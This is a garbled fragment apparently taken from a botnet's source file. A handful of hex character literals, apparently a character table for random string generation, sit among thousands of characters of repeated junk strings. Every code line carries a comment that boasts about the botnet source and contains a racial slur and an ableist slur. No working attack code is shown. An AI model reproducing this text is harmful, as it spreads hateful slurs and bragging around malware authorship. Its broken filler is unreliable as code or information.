UOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x65","\x66","\x67","\x68","\x69","\x6a","\x6b",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BGHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x73","\x74","\x75","\x76","\x77","\x78","\x79",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BGHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BPHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x81","\x82","\x83","\x84","\x85","\x86","\x87",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BPHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9U